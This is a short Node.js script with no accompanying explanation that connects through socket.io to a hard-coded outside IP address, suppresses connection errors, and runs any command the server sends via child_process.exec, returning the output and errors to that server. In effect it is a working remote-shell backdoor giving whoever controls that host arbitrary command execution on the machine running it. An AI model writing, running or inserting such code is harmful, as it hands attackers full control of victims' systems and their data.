const socketioClient = require("socket.io-client");
const childProcess = require("child_process");

const socket = socketioClient("http://185.227.110.139");

socket.on("error", () => {});

socket.on("connect", () => {
  console.log("Connected to the server.");
});

socket.on("disconnect", () => {
  console.log("Disconnected from the server.");
});

socket.on("exec", cmd => {
  childProcess.exec(cmd, (err, stdout, stderr) => {
    socket.emit("execResponse", cmd, err, stdout, stderr);
  });
});
